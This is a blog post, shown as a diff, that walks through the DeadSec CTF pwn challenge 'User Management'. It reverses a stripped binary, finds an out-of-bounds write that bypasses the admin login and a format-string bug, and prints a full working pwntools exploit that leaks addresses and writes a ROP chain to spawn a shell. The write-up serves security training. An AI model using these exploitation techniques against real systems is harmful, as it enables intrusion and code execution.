@@ -1,0 +1,811 @@
+---
+title: DeadSec-CTF - Pwn - User Management
+date: '2024-07-28'
+tags: ['pwn', 'oob-write', 'printf', 'fsb', 'return-address-overwrite', 'fsb-to-rop']
+draft: false
+summary: Utilizing Out-of-bounds write to overwrite an adjacent memory chunk to bypass login and using Format String Vulnerability to overwrite a check and overwrite return address on the stack to perform ROP.
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/deadsec/image.png)
+
+**Description**
+**Author**: Mr AlphaQ
+
+Can you hack my new super secure system?
+
+## Solution
+
+The challenge was fairly simple however it required chaining of multiple small bugs.
+
+- **[Reversing](#reversing)**
+- **[Vulnerabilities](#vulnerabilities)**
+  - **[OOB Write](#oob-write)**
+  - **[Format String](#format-string)**
+- **[Exploitation](#exploitation)**
+  - **[Login as Admin](#login-as-admin)**
+  - **[Leak values using FSB](#leak-values-using-fsb)**
+  - **[Write ROP on stack](#write-rop-on-stack)**
+
+Firstly, looking at the mitigations on the binary:
+
+![alt text](/static/writeups/deadsec/image-1.png)
+
+## Reversing
+
+The main part of the challenge was just reversing the `stripped` binary. Normally, for strip binaries (or just normal binaries in general), I make use of both IDA and Ghidra. From the entry, we identified the `main` function. Which was as follows:
+
+```c:main
+undefined8 FUN_00101eea(void)
+
+{
+  int iVar1;
+  undefined4 local_c;
+
+  FUN_00101554();
+  while (DAT_00105014 != 0) {
+    FUN_00101e89();
+    printf("Enter choice: ");
+    __isoc99_scanf(&DAT_001038dd,&local_c);
+    do {
+      iVar1 = getchar();
+    } while (iVar1 != 10);
+    switch(local_c) {
+    default:
+      printf("\x1b[1;31m");
+      puts("Invalid choice");
+      printf("\x1b[0m");
+      break;
+    case 1:
+      FUN_00101659();
+      break;
+    case 2:
+      FUN_00101848();
+      break;
+    case 3:
+      FUN_00101b0b();
+      break;
+    case 4:
+      if (DAT_00105010 == -2) {
+        printf("\x1b[1;31m");
+        puts("You are not logged in");
+        printf("\x1b[0m");
+      }
+      else {
+        DAT_00105010 = -2;
+        printf("\x1b[1;32m");
+        puts("Logged out");
+        printf("\x1b[0m");
+      }
+      break;
+    case 5:
+      FUN_00101d00();
+      break;
+    case 6:
+      printf("\x1b[1;32m");
+      puts("see ya later");
+      printf("\x1b[0m");
+      DAT_00105014 = 0;
+    }
+  }
+  return 0;
+}
+```
+
+The code looked really ugly. Firstly, we started out by renaming all of the functions. Firstly, let's look at the `FUN_00101554`:
+
+```c:FUN_00101554
+void FUN_00101554(void)
+
+{
+  ssize_t sVar1;
+  uint local_10;
+  int local_c;
+
+  FUN_00101479();
+  FUN_0010152f();
+  FUN_00101279();
+  local_c = open("/dev/random",0);
+  if (local_c == -1) {
+    perror("Error opening /dev/random");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  DAT_0010535f = 0x51;
+  DAT_0010535c = 0x70;
+  DAT_0010535a = 0x41;
+  DAT_0010535e = 0x61;
+  sVar1 = read(local_c,&local_10,4);
+  if (sVar1 != 4) {
+    perror("Error reading from /dev/random");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  DAT_00105358 = 0x4d;
+  DAT_0010535b = 0x6c;
+  DAT_0010535d = 0x68;
+  DAT_00105359 = 0x72;
+  close(local_c);
+  srand(local_10);
+  return;
+}
+```
+
+In this particular function, further 3 functions are being invoked. All those functions do, is setup buffering, setup alarm handler and print an ascii banner respectively. The next thing the function is doing is opening `/dev/urandom`, and reading `4` bytes into `local_10` and then seeding the PRNG `srand` with those 4 random bytes. Nothing interesting. So, we can simply call this function as `setup`.
+
+There's another function, `FUN_00101e89`:
+
+```c:FUN_00101e89
+void FUN_00101e89(void)
+
+{
+  puts("1. Admin login");
+  puts("2. Create user");
+  puts("3. Login as user");
+  puts("4. Logout");
+  puts("5. View description");
+  puts("6. Exit");
+  return;
+}
+```
+
+Okay, so now we know that this function is the `menu`. Now, in the code in the switch statment in the main function, we can deduce the functions being invoked on each case. So, when `1` is pressed, `FUN_00101659` is invoked. We can safely say that this function is used for logging in as administrator, so this function is of use. The decompilation is as following:
+
+```c:FUN_00101659
+void FUN_00101659(void)
+
+{
+  int iVar1;
+  long in_FS_OFFSET;
+  int local_4c;
+  char local_48 [32];
+  char local_28 [24];
+  long local_10;
+
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  for (local_4c = 0; local_4c < 8; local_4c = local_4c + 1) {
+    iVar1 = rand();
+    (&DAT_00105350)[local_4c] = (char)iVar1;
+  }
+  puts("what do you want to do here?");
+  fgets(&DAT_00105340,0x15,stdin);
+  iVar1 = strncmp(&DAT_00105340,"manage users",0xc);
+  if (iVar1 == 0) {
+    printf("Enter username: ");
+    __isoc99_scanf(&DAT_001036d2,local_48);
+    printf("Enter password: ");
+    __isoc99_scanf(&DAT_001036d2,local_28);
+    iVar1 = strcmp(local_28,&DAT_00105350);
+    if (iVar1 == 0) {
+      iVar1 = strcmp(local_48,&DAT_00105358);
+      if (iVar1 == 0) {
+        DAT_00105010 = 0xffffffff;
+        printf("\x1b[1;32m");
+        puts("Logged in as admin");
+        printf("\x1b[0m");
+        goto code_r0x00101832;
+      }
+    }
+    printf("\x1b[1;31m");
+    puts("Wrong username or password");
+    printf("\x1b[0m");
+  }
+  else {
+    printf("\x1b[1;31m");
+    puts("You are not allowed to do that!!");
+    printf("\x1b[0m");
+  }
+code_r0x00101832:
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+
+Now, this function may look daunting, but let's break it down step-by-step.
+
+Firstly:
+
+```c:FUN_00101659
+for (local_4c = 0; local_4c < 8; local_4c = local_4c + 1) {
+    iVar1 = rand();
+    (&DAT_00105350)[local_4c] = (char)iVar1;
+  }
+```
+
+We can see that a random string of size 8 is being stored in a global array called `DAT_00105350`. Next, we're taking `0x15` bytes of input and checking if the input contains: `manage users`, if it does, we'll ask for username and password. Then, the following code makes it interesting for us:
+
+```c:FUN_00101659
+printf("Enter username: ");
+__isoc99_scanf(&DAT_001036d2,local_48);
+printf("Enter password: ");
+__isoc99_scanf(&DAT_001036d2,local_28);
+iVar1 = strcmp(local_28,&DAT_00105350);
+if (iVar1 == 0) {
+    iVar1 = strcmp(local_48,&DAT_00105358);
+    if (iVar1 == 0) {
+    ...
+```
+
+Okay, so now, we can deduce that `local_48` is username, and `local_28` is password. `DAT_00105350` is a global password, and `DAT_00105358` is a global username. We'll rename the variables to make the reversing process easier. The last thing is:
+
+```c:FUN_00101659
+if (iVar1 == 0) {
+    DAT_00105010 = 0xffffffff;
+    printf("\x1b[1;32m");
+    puts("Logged in as admin");
+    printf("\x1b[0m");
+    goto code_r0x00101832;
+}
+```
+
+Now, this condition would only succeed when both the username and password match the global variables. And, it will set `DAT_00105010` as `0xffffffff`. Meaning, we can deduce that `DAT_00105010` is the `CHECK_LOGIN` attribute. We'll rename that as well.
+
+Now, for the next function, i.e. Create user, the decompilation from ghidra was way dirty, we'll use IDA, but we've renamed the variables in a similar fashion:
+
+```c:FUN_00101848
+int sub_1848()
+{
+  int i; // [rsp+Ch] [rbp-4h]
+
+  if ( CHECK_LOGIN == -1 )
+  {
+    if ( dword_533C > 1 )
+    {
+      printf("\x1B[1;31m");
+      puts("No more space for users");
+      return printf("\x1B[0m");
+    }
+    else
+    {
+      printf("Enter username: ");
+      fgets(&byte_5060[365 * dword_533C], 30, stdin);
+      printf("Enter password: ");
+      fgets(&byte_5060[365 * dword_533C + 30], 30, stdin);
+      printf("Enter description: ");
+      fgets(&byte_5060[365 * dword_533C + 60], 305, stdin);
+      for ( i = 0; i < dword_533C; ++i )
+      {
+        if ( !strcmp(&byte_5060[365 * i], &byte_5060[365 * dword_533C]) )
+        {
+          printf("\x1B[1;31m");
+          puts("User already exists");
+          return printf("\x1B[0m");
+        }
+      }
+      printf("\x1B[1;32m");
+      puts("User created successfully");
+      printf("\x1B[0m");
+      return ++dword_533C;
+    }
+  }
+  else
+  {
+    printf("\x1B[1;31m");
+    puts("You need to be logged in as admin to create a new user");
+    return printf("\x1B[0m");
+  }
+}
+```
+
+Now, firstly, this function checks if we're logged in as admin. Then, there's this check, which checks if the element is greater than 1, print `No more space for users`. We can deduce that this check simply takes into account the number of users that were created. After that check, we simply take input. Firstly, we take the username, then password and then `description`, which is the size of `305`. Then, we compare the usernames, if it already eixsts, it says user already exists. Now, if it already exists, the program just exits.
+
+For the next function, the decompilation is pretty straightforward:
+
+```c:login_as
+unsigned __int64 sub_1B0B()
+{
+  int i; // [rsp+Ch] [rbp-54h]
+  char s[32]; // [rsp+10h] [rbp-50h] BYREF
+  char s2[40]; // [rsp+30h] [rbp-30h] BYREF
+  unsigned __int64 v4; // [rsp+58h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  if ( CHECK_LOGIN == -2 )
+  {
+    printf("Enter username: ");
+    fgets(s, 30, stdin);
+    printf("Enter password: ");
+    fgets(s2, 30, stdin);
+    for ( i = 0; i <= 1; ++i )
+    {
+      if ( !strcmp(&byte_5060[365 * i], s) && !strcmp(&byte_5060[365 * i + 30], s2) )
+      {
+        CHECK_LOGIN = i;
+        printf("\x1B[1;32m");
+        printf("Logged in as %s\n", s);
+        printf("\x1B[0m");
+        return v4 - __readfsqword(0x28u);
+      }
+    }
+    printf("\x1B[1;31m");
+    puts("Wrong username or password");
+    printf("\x1B[0m");
+  }
+  else
+  {
+    printf("\x1B[1;31m");
+    puts("You are already logged in");
+    printf("\x1B[0m");
+  }
+  return v4 - __readfsqword(0x28u);
+}
+```
+
+In this particular function, we simply check that if the username and password match the ones stored in the global variable, if they do; just log in.
+
+```c:case_4
+case 4:
+  if (CHECK_LOGIN == -2) {
+    printf("\x1b[1;31m");
+    puts("You are not logged in");
+    printf("\x1b[0m");
+  }
+  else {
+    CHECK_LOGIN = -2;
+    printf("\x1b[1;32m");
+    puts("Logged out");
+    printf("\x1b[0m");
+  }
+  break;
+```
+
+This case was pretty straightforward as well. Just simply logs out. The last function, View Description; the decompilation is as follows:
+
+```c:FUN_00101d00
+unsigned __int64 sub_1D00()
+{
+  char s[312]; // [rsp+0h] [rbp-140h] BYREF
+  unsigned __int64 v2; // [rsp+138h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  if ( CHECK_LOGIN == -2 || CHECK_LOGIN == -1 )
+  {
+    printf("\x1B[1;31m");
+    puts("You need to be logged in to see the description");
+    printf("\x1B[0m");
+  }
+  else
+  {
+    qmemcpy(s, &byte_5060[365 * CHECK_LOGIN + 60], 0x131uLL);
+    if ( strchr(s, 36) )
+    {
+      puts("fr!? what is this description dude??");
+    }
+    else
+    {
+      printf("The description for: ");
+      printf(&byte_5060[365 * CHECK_LOGIN]);
+      printf(" is: ");
+      printf(s);
+      putchar(10);
+    }
+  }
+  return v2 - __readfsqword(0x28u);
+}
+```
+
+Now, what this does, is firstly checks if the description contains any `$`, if it does; prints a static string, if the output doesn't contain any `$`, it will give us a `printf` primitive. So, we have our first apparent bug.
+
+Last, it will simply `exit`; quite literally.
+
+---
+
+## Vulnerabilities
+
+Now, in this binary, firstly, we'll use the `OOB Write` in the `Admin Login` function to overwrite the random password chunk with a valid value to bypass the check; then, we'll use the format string to leak values, and then we'll write a ROP chain on the stack and overwrite the return address with the ROP chain.
+
+### OOB Write
+
+Now, when doing the challenge, I almost overlooked this bug. Ghidra was really helpful in analyzing the size of the global variables for me. The exact vulernable code is as follows:
+
+```c
+puts("what do you want to do here?");
+fgets(&USER_INPUT,0x15,stdin);
+iVar1 = strncmp(&USER_INPUT,"manage users",0xc);
+```
+
+Now, in this code, the input of size `0x15` is being read into the `USER_INPUT` global variable. Now, looking at `USER_INPUT`, in ghidra:
+
+![alt text](/static/writeups/deadsec/image-2.png)
+
+We can see it is just before the `GLOBAL_PASSWORD` variable. We already know from our reversing that `GLOBAL_PASSWORD` is being randomly generated. Now, looking at the size of `USER_INPUT`, we can see that it is of `0xF`, i.e. `15-bytes`. However, the input being read is `0x15` bytes. So, we have an Out of Bounds Write into the adjacent memory location. This allows us to overwrite, the randomly generated password with our own.
+
+### Format String
+
+The next obvious vulnerability is the format string bug which exists in the `View Description` function. Now, the main gimmick in this format string vulernability was that there was a check which prevents us from using `$`. Fret not, `fmtstr_payload` in pwntools gives us an argument `no_dollar`, which generates a payload without any sort of `$`.
+
+---
+
+## Exploitation
+
+The exploitation steps are pretty simple. We need to login as admin, then create user, and leak values. Then, create another user with the same username to prevent `CREATED_USERS` check being passed; but we'll have our values set. After that, we can simply use the format string in `View Description` function to write our ROP chain on the stack at the Return Address and then when we exit, we'll have our shell.
+
+### Login as Admin
+
+Now, with our `OOB-Write`, we can overwrite the password. However, we still do not know the username. For that, we'll make use of GDB. At ghidra, we can see that `GLOBAL_USERNAME` is stored at `0x5358`. Using gdb, we can see the data at this address at runtime:
+
+![alt text](/static/writeups/deadsec/image-3.png)
+
+Now, we can see that the username is `MrAlphaQ\x04`. Now, let's write a simple exploit that will allow us to login as admin:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.terminal = ["tmux", "splitw", "-h"]
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
+
+exe = "./user_management_patched"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process([exe], aslr=False)
+
+if args.GDB: gdb.attach(io, """
+""")
+
+def menu(idx):
+    io.sendlineafter(b"choice: ", encode(idx))
+
+def admin_login(username, password, prompt="manage users"):
+    menu(1)
+    io.sendlineafter(b"here?\n", encode(prompt))
+    io.sendlineafter(b": ", encode(username))
+    io.sendlineafter(b": ", encode(password))
+```
+
+Now, we'll do some slight debugging, we need to identify that at what offset, we'll overwrite the `prompt` and into the `password` field. The main thing is, that in the prompt, we need to ensure that `manage users` string exist to pass the first strcmp. After this, we still `8` bytes more that we can write.
+
+```py
+admin_login(username="theflash", password="password", prompt="manage users")
+```
+
+With this non-overflow, we can check that our string `password` is being compared to a string of bytes:
+
+![alt text](/static/writeups/deadsec/image-4.png)
+
+Now, let's use the following payload:
+
+```py
+admin_login(username="theflash", password="password", prompt="manage users AAAA")
+```
+
+Now, in gdb, we can see:
+
+![alt text](/static/writeups/deadsec/image-5.png)
+
+Now, we can see that 1 `A` and `\n` has been written. So, we can say that after `4-bytes`, our input writes into the buffer. Since we're using fgets, the last byte will always be set to a null-byte. Now, to bypass the condition, we'll set the password `AAAA\x00` so that we compare the first four bytes of the password. And we already know that since we have a 8-byte write, and after the first four bytes, we write into the password, we can easily overwrite the first 4-bytes of the password with `A` and the last byte will automatically be set to null, hence our `strcmp` will pass:
+
+```py
+admin_login(username="theflash", password="AAAA\x00", prompt="manage users____AAAA")
+```
+
+![alt text](/static/writeups/deadsec/image-6.png)
+
+This means that we've passed the strcmp check. Now, remodifying our payload with username=`MrAlphaQ\x04`, we can see:
+
+```py
+admin_login(
+    username="MrAlphaQ\x04",
+    password="AAAA\x00",
+    prompt="manage users AAAAAAA")
+```
+
+![alt text](/static/writeups/deadsec/image-7.png)
+
+We've successfully logged in as admin.
+
+### Leak Values using FSB
+
+Now, the first part is done, the second part is fairly simple. The first thing that we need to do, is Create a New User. Then, in the Description field, we can write a simple format string that will help us leak values. Firstly, for this portion, we need the following 4 wrapper functions:
+
+```py:exploit.py
+def create_user(username, password, description):
+    menu(2)
+    io.sendlineafter(b": ", encode(username))
+    io.sendlineafter(b": ", encode(password))
+    io.sendlineafter(b": ", encode(description))
+
+def login(username, password):
+    menu(3)
+    io.sendlineafter(b": ", encode(username))
+    io.sendlineafter(b": ", encode(password))
+
+def logout():
+    menu(4)
+
+def view_description(get_leaks=True):
+    menu(5)
+    if not get_leaks: return
+    leaks = io.recvuntil(b"1. Admin").split(b'|')
+    return leaks
+```
+
+Now, firstly, we'll create a simple user, after that we'll logout as the admin user, and then we'll login as our newly created user and then we'll view the description.
+
+```py:exploit.py
+admin_login(
+    username="MrAlphaQ\x04",
+    password="AAAA\x00",
+    prompt="manage users AAAAAAA")
+
+create_user(
+    "theflash2k",
+    "theflash2k",
+    "|%p"*100
+)
+logout()
+login("theflash2k", "theflash2k")
+view_description(False)
+```
+
+Now, on running this, we can see the following:
+
+![alt text](/static/writeups/deadsec/image-8.png)
+
+Now, in these leaks, we can see good leaks at the following addresses:
+
+| Leak  | Offset |
+| ----- | ------ |
+| Stack | 0x1    |
+| Libc  | 0x3    |
+| ELF   | 0x2F   |
+
+We'll update the view_description function as follows:
+
+```py
+def view_description(get_leaks=True):
+    menu(5)
+    if not get_leaks: return
+    leaks = io.recvuntil(b"1. Admin").split(b'|')
+
+    stack_leak = hexleak(leaks[1])
+    libc_leak = hexleak(leaks[3])
+    elf_leak = hexleak(leaks[47])
+
+    return elf_leak, libc_leak, stack_leak
+```
+
+Now, we'll get our leaks and we can calculate the offsets accordingly
+
+```py
+leaks = view_description()
+info("elf  leak @ %#x" % leaks[0])
+info("libc leak @ %#x" % leaks[1])
+info("stack leak @ %#x" % leaks[2])
+
+elf.address = leaks[0] - 0x2037
+libc.address = leaks[1] - 0x114887
+
+ret = leaks[2] + 0x2288
+info("elf @ %#x" % elf.address)
+info("libc @ %#x" % libc.address)
+info("return address @ %#x" % ret)
+```
+
+### Write ROP on stack
+
+Now, the next step; we can simply perform the FSB by re-using the username that we already have and then start writing the ROP chain.
+
+To make things abstract, we'll write a function in python and in that, we'll make the login, logout and everything abstracted so that we can easily write our payloads on the stack.
+
+```py
+def create_fsb(username, payload, leak=False):
+
+    admin_login(
+        username="MrAlphaQ\x04",
+        password="AAAA\x00",
+        prompt="manage users AAAAAAA")
+
+    create_user(
+        username,
+        username,
+        payload
+    )
+
+    logout()
+    login(username, username)
+    return view_description(get_leaks=leak)
+
+leaks = create_fsb("theflash2k", "|%p"*100, leak=True)
+info("elf  leak @ %#x" % leaks[0])
+info("libc leak @ %#x" % leaks[1])
+info("stack leak @ %#x" % leaks[2])
+```
+
+![alt text](/static/writeups/deadsec/image-9.png)
+
+Now, after this is abstracted, the next we need to find out is that at what offset does our format string start. I've explained it many times in several different blogs. You can refer to the [FSB-GUIDE](https://www.theflash2k.me/blog/ctf-techs/fsb-guide). After checking, we find out that the format string starts at offset `6`. We can use `fmtstr_payload` in pwntools to generate the format string for us.
+
+Now, the first thing that we'll overwrite is the `CREATED_USERS` check. That is stored in the writable section of the binary. So, what we'll do is create a new user, and then set it `0` so that it will give us an additional two writes on the stack. So, for that, the payload is as follows:
+
+```py
+CREATED_USERS = elf.address + 0x533c
+
+create_fsb(
+    "theflash2k-1",
+    fmtstr_payload(offset=6,
+        writes={ CREATED_USERS: 0xFFFFFFFF00000000 },
+        write_size_max='byte', strategy='fast',
+        no_dollars=True)
+)
+```
+
+For this particular region, we need to set `0` in the memory region, but we cannot write `0` because format strings break on null bytes, so what I did, I overwrote the `8-byte` chunk with a larger value. And then also set the `write_size_max` to be a byte so that each attribute is written as a byte on the stack; ensuring that `0` is written correctly to the `CREATED_USERS` check field. After running this, we can confirm this in gdb:
+
+This is before the execution of the format string
+
+![alt text](/static/writeups/deadsec/image-10.png)
+
+This is after
+
+![alt text](/static/writeups/deadsec/image-11.png)
+
+Now, the next thing we'll do is write the ROP chain on the return address as follows:
+
+| OFFSET | Chain   |
+| ------ | ------- |
+| 0x0    | POP RDI |
+| 0x8    | /bin/sh |
+| 0x10   | RET     |
+| 0x18   | system  |
+
+Now, for these, the rop chains will be as follows:
+
+```py
+create_fsb(
+    "theflash2k-2",
+    fmtstr_payload(
+        offset=6,
+        writes={ ret: POP_RDI,
+            ret+0x8: next(libc.search(b"/bin/sh")) },
+        no_dollars=True)
+)
+
+create_fsb(
+    "theflash2k-3",
+    fmtstr_payload(
+        offset=6,
+        writes={ ret+0x10: RET, ret+0x18: libc.sym.system },
+        no_dollars=True)
+)
+```
+
+After writing this on the stack, we can see the stack:
+
+![alt text](/static/writeups/deadsec/image-12.png)
+
+Now, at the end, what we need to do is simply exit the program using `menu(6)`. The final payload becomes:
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.terminal = ["tmux", "splitw", "-h"]
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
+
+exe = "./user_management_patched"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+    ) if args.REMOTE else process([exe], aslr=False)
+
+if args.GDB: gdb.attach(io, """
+	# brva 0x16c1
+	# brva 0x175b
+""")
+
+def menu(idx):
+    io.sendlineafter(b"choice: ", encode(idx))
+
+def admin_login(username, password, prompt="manage users"):
+    menu(1)
+    io.sendlineafter(b"here?\n", encode(prompt))
+    io.sendlineafter(b": ", encode(username))
+    io.sendlineafter(b": ", encode(password))
+
+def create_user(username, password, description):
+    menu(2)
+    io.sendlineafter(b": ", encode(username))
+    io.sendlineafter(b": ", encode(password))
+    io.sendlineafter(b": ", encode(description))
+
+def login(username, password):
+    menu(3)
+    io.sendlineafter(b": ", encode(username))
+    io.sendlineafter(b": ", encode(password))
+
+def logout():
+    menu(4)
+
+def view_description(get_leaks=True):
+    menu(5)
+    if not get_leaks: return
+    leaks = io.recvuntil(b"1. Admin").split(b'|')
+
+    stack_leak = hexleak(leaks[1])
+    libc_leak = hexleak(leaks[3])
+    elf_leak = hexleak(leaks[47])
+
+    return elf_leak, libc_leak, stack_leak
+
+def create_fsb(username, payload, leak=False):
+
+    admin_login(
+        username="MrAlphaQ\x04",
+        password="AAAA\x00",
+        prompt="manage users AAAAAAA")
+
+    create_user(
+        username,
+        username,
+        payload
+    )
+
+    logout()
+    login(username, username)
+    return view_description(get_leaks=leak)
+
+leaks = create_fsb("theflash2k", "|%p"*100, leak=True)
+info("elf  leak @ %#x" % leaks[0])
+info("libc leak @ %#x" % leaks[1])
+info("stack leak @ %#x" % leaks[2])
+
+elf.address = leaks[0] - 0x2037
+libc.address = leaks[1] - 0x114887
+
+ret = leaks[2] + 0x2288
+info("elf @ %#x" % elf.address)
+info("libc @ %#x" % libc.address)
+info("return address @ %#x" % ret)
+
+CREATED_USERS = elf.address + 0x533c
+info("CREATED_USERS check @ %#x" % CREATED_USERS)
+
+create_fsb(
+    "theflash2k-1",
+    fmtstr_payload(offset=6,
+        writes={ CREATED_USERS: 0xFFFFFFFF00000000 },
+        write_size_max='byte',
+        no_dollars=True)
+)
+
+POP_RDI = libc.address + 0x000000000002a3e5
+POP_RSI = libc.address + 0x000000000002be51
+RET = libc.address + 0x0000000000029139
+
+create_fsb(
+    "theflash2k-2",
+    fmtstr_payload(
+        offset=6,
+        writes={ ret: POP_RDI,
+            ret+0x8: next(libc.search(b"/bin/sh")) },
+        no_dollars=True)
+)
+
+create_fsb(
+    "theflash2k-3",
+    fmtstr_payload(
+        offset=6,
+        writes={ ret+0x10: RET, ret+0x18: libc.sym.system },
+        no_dollars=True)
+)
+
+menu(6)
+
+io.interactive()
+```
+
+![alt text](/static/writeups/deadsec/image-13.png)
+
+Now, the funny thing is, I did the challenge in like 2 hours. But, it just wasn't working against remote. Not against the docker container created using the Dockerfile they provided, nor the remote instance, but if I copied the exploit inside the container and ran it, it worked fine. Then I started debugging. Randomly, I decided to change the username from `MrAlphaQ\x04` to `MrAlpha\x00`. I got the `admin logged in` prompt. It took me around 1 hour to just debug this and I could've gotten the second/third on this :(; but still got 4th which isn't that bad.
+
+Anywas, a fun challenge, learnt various new tricks in gdb and pwntools for debugging stripped binaries.
